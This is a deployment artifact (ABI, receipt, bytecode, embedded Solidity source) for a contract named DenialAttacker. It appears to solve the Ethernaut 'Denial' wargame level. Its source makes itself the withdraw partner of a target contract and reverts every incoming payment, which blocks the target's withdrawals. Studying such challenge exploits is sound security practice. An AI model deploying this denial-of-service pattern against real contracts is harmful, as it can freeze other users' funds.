{
  "address": "0x7869a127827D6044A41300EbFf1e61C6156dF8CA",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_initialOwner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_initialContract",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        }
      ],
      "name": "OwnableInvalidOwner",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "OwnableUnauthorizedAccount",
      "type": "error"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "setAttack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_partner",
          "type": "address"
        }
      ],
      "name": "setPartner",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "targetContract",
      "outputs": [
        {
          "internalType": "contract IDenial",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "transactionHash": "0x237cc7dcb031f3829e49be24d25977c022510e2d69ad18cc4126654325bc065b",
  "receipt": {
    "to": null,
    "from": "0xcC6eDeB501BbD8AD9E028BDe937B63Cdd64A1D91",
    "contractAddress": "0x7869a127827D6044A41300EbFf1e61C6156dF8CA",
    "transactionIndex": 250,
    "gasUsed": "309705",
    "logsBloom": "0x
    "blockHash": "0x4200d2880b5693c18ad353729fae3d44f5197c343b1c7cb9aebd4ceb58a1dcb5",
    "transactionHash": "0x237cc7dcb031f3829e49be24d25977c022510e2d69ad18cc4126654325bc065b",
    "logs": [
      {
        "transactionIndex": 250,
        "blockNumber": 8190270,
        "transactionHash": "0x237cc7dcb031f3829e49be24d25977c022510e2d69ad18cc4126654325bc065b",
        "address": "0x7869a127827D6044A41300EbFf1e61C6156dF8CA",
        "topics": [
          "0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0",
          "0x0000000000000000000000000000000000000000000000000000000000000000",
          "0x000000000000000000000000cc6edeb501bbd8ad9e028bde937b63cdd64a1d91"
        ],
        "data": "0x",
        "logIndex": 491,
        "blockHash": "0x4200d2880b5693c18ad353729fae3d44f5197c343b1c7cb9aebd4ceb58a1dcb5"
      }
    ],
    "blockNumber": 8190270,
    "cumulativeGasUsed": "21505545",
    "status": 1,
    "byzantium": true
  },
  "args": [
    "0xcC6eDeB501BbD8AD9E028BDe937B63Cdd64A1D91",
    "0x031048665c18753BC5848F724d4906AF7AaFB7c2"
  ],
  "numDeployments": 1,
  "solcInputHash": "72839cec5ac0820f1a6764984454ec17",
  "metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_initialOwner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_initialContract\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnableInvalidOwner\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"OwnableUnauthorizedAccount\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"setAttack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_partner\",\"type\":\"address\"}],\"name\":\"setPartner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"targetContract\",\"outputs\":[{\"internalType\":\"contract IDenial\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"errors\":{\"OwnableInvalidOwner(address)\":[{\"details\":\"The owner is not a valid owner account. (eg. `address(0)`)\"}],\"OwnableUnauthorizedAccount(address)\":[{\"details\":\"The caller account is not authorized to perform an operation.\"}]},\"kind\":\"dev\",\"methods\":{\"owner()\":{\"details\":\"Returns the address of the current owner.\"},\"renounceOwnership()\":{\"details\":\"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner.\"},\"transferOwnership(address)\":{\"details\":\"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/DenialAttacker.sol\":\"DenialAttacker\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/access/Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Context} from \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * The initial owner is set to the address provided by the deployer. This can\\n * later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    /**\\n     * @dev The caller account is not authorized to perform an operation.\\n     */\\n    error OwnableUnauthorizedAccount(address account);\\n\\n    /**\\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\\n     */\\n    error OwnableInvalidOwner(address owner);\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\\n     */\\n    constructor(address initialOwner) {\\n        if (initialOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(initialOwner);\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        if (owner() != _msgSender()) {\\n            revert OwnableUnauthorizedAccount(_msgSender());\\n        }\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby disabling any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        if (newOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\",\"keccak256\":\"0xff6d0bb2e285473e5311d9d3caacb525ae3538a80758c10649a4d61029b017bb\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n\\n    function _contextSuffixLength() internal view virtual returns (uint256) {\\n        return 0;\\n    }\\n}\\n\",\"keccak256\":\"0x493033a8d1b176a037b2cc6a04dad01a5c157722049bbecf632ca876224dd4b2\",\"license\":\"MIT\"},\"contracts/DenialAttacker.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\nimport \\\"@openzeppelin/contracts/access/Ownable.sol\\\";\\n\\ninterface IDenial {\\n    function withdraw() external;\\n    function setWithdrawPartner(address _partner) external;\\n}\\n\\ncontract DenialAttacker is Ownable{\\n\\n    IDenial public targetContract;\\n\\n    constructor(address _initialOwner, address _initialContract) Ownable(_initialOwner) {\\n        targetContract = IDenial(_initialContract);\\n    }\\n\\n    function attack() public{\\n        targetContract.withdraw();\\n    }\\n\\n    function setPartner(address _partner) public onlyOwner {\\n        targetContract.setWithdrawPartner(_partner);\\n    }\\n\\n    function setAttack(address _addr) public onlyOwner {\\n        targetContract = IDenial(_addr);\\n    }\\n\\n    receive() external payable {\\n        // while (true) {\\n        //     assert(false);\\n        // }\\n        assert(false);\\n    }\\n\\n    \\n}\",\"keccak256\":\"0x77f5141c5c26aa715ceb15f124bdec499f849ac9fcdabf924f911e3aa5fd0ee1\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x608060405234801561001057600080fd5b506040516104f23803806104f283398101604081905261002f916100fa565b816001600160a01b03811661005e57604051631e4fbdf760e01b81526000600482015260240160405180910390fd5b6100678161008e565b50600180546001600160a01b0319166001600160a01b03929092169190911790555061012d565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b80516001600160a01b03811681146100f557600080fd5b919050565b6000806040838503121561010d57600080fd5b610116836100de565b9150610124602084016100de565b90509250929050565b6103b68061013c6000396000f3fe6080604052600436106100745760003560e01c80639e5faafc1161004e5780639e5faafc146100f3578063a16d596014610108578063bd90df7014610128578063f2fde38b1461014857600080fd5b8063715018a614610088578063741690e21461009d5780638da5cb5b146100bd57600080fd5b366100835761008161033a565b005b600080fd5b34801561009457600080fd5b50610081610168565b3480156100a957600080fd5b506100816100b8366004610350565b61017c565b3480156100c957600080fd5b506000546001600160a01b03165b6040516001600160a01b03909116815260200160405180910390f35b3480156100ff57600080fd5b506100816101a6565b34801561011457600080fd5b50610081610123366004610350565b610210565b34801561013457600080fd5b506001546100d7906001600160a01b031681565b34801561015457600080fd5b50610081610163366004610350565b61027a565b6101706102bd565b61017a60006102ea565b565b6101846102bd565b600180546001600160a01b0319166001600160a01b0392909216919091179055565b600160009054906101000a90046001600160a01b03166001600160a01b0316633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101f657600080fd5b505af115801561020a573d6000803e3d6000fd5b50505050565b6102186102bd565b600154604051631387164560e21b81526001600160a01b03838116600483015290911690634e1c591490602401600060405180830381600087803b15801561025f57600080fd5b505af1158015610273573d6000803e3d6000fd5b5050505050565b6102826102bd565b6001600160a01b0381166102b157604051631e4fbdf760e01b8152600060048201526024015b60405180910390fd5b6102ba816102ea565b50565b6000546001600160a01b0316331461017a5760405163118cdaa760e01b81523360048201526024016102a8565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b634e487b7160e01b600052600160045260246000fd5b60006020828403121561036257600080fd5b81356001600160a01b038116811461037957600080fd5b939250505056fea26469706673582212209823eb7a94bf959b1f9db73cb40b714d6c99121689aa71a5877553f11679b72364736f6c63430008140033",
  "deployedBytecode": "0x6080604052600436106100745760003560e01c80639e5faafc1161004e5780639e5faafc146100f3578063a16d596014610108578063bd90df7014610128578063f2fde38b1461014857600080fd5b8063715018a614610088578063741690e21461009d5780638da5cb5b146100bd57600080fd5b366100835761008161033a565b005b600080fd5b34801561009457600080fd5b50610081610168565b3480156100a957600080fd5b506100816100b8366004610350565b61017c565b3480156100c957600080fd5b506000546001600160a01b03165b6040516001600160a01b03909116815260200160405180910390f35b3480156100ff57600080fd5b506100816101a6565b34801561011457600080fd5b50610081610123366004610350565b610210565b34801561013457600080fd5b506001546100d7906001600160a01b031681565b34801561015457600080fd5b50610081610163366004610350565b61027a565b6101706102bd565b61017a60006102ea565b565b6101846102bd565b600180546001600160a01b0319166001600160a01b0392909216919091179055565b600160009054906101000a90046001600160a01b03166001600160a01b0316633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101f657600080fd5b505af115801561020a573d6000803e3d6000fd5b50505050565b6102186102bd565b600154604051631387164560e21b81526001600160a01b03838116600483015290911690634e1c591490602401600060405180830381600087803b15801561025f57600080fd5b505af1158015610273573d6000803e3d6000fd5b5050505050565b6102826102bd565b6001600160a01b0381166102b157604051631e4fbdf760e01b8152600060048201526024015b60405180910390fd5b6102ba816102ea565b50565b6000546001600160a01b0316331461017a5760405163118cdaa760e01b81523360048201526024016102a8565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b634e487b7160e01b600052600160045260246000fd5b60006020828403121561036257600080fd5b81356001600160a01b038116811461037957600080fd5b939250505056fea26469706673582212209823eb7a94bf959b1f9db73cb40b714d6c99121689aa71a5877553f11679b72364736f6c63430008140033",
  "devdoc": {
    "errors": {
      "OwnableInvalidOwner(address)": [
        {
          "details": "The owner is not a valid owner account. (eg. `address(0)`)"
        }
      ],
      "OwnableUnauthorizedAccount(address)": [
        {
          "details": "The caller account is not authorized to perform an operation."
        }
      ]
    },
    "kind": "dev",
    "methods": {
      "owner()": {
        "details": "Returns the address of the current owner."
      },
      "renounceOwnership()": {
        "details": "Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner."
      },
      "transferOwnership(address)": {
        "details": "Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."
      }
    },
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 8,
        "contract": "contracts/DenialAttacker.sol:DenialAttacker",
        "label": "_owner",
        "offset": 0,
        "slot": "0",
        "type": "t_address"
      },
      {
        "astId": 194,
        "contract": "contracts/DenialAttacker.sol:DenialAttacker",
        "label": "targetContract",
        "offset": 0,
        "slot": "1",
        "type": "t_contract(IDenial)189"
      }
    ],
    "types": {
      "t_address": {
        "encoding": "inplace",
        "label": "address",
        "numberOfBytes": "20"
      },
      "t_contract(IDenial)189": {
        "encoding": "inplace",
        "label": "contract IDenial",
        "numberOfBytes": "20"
      }
    }
  }
}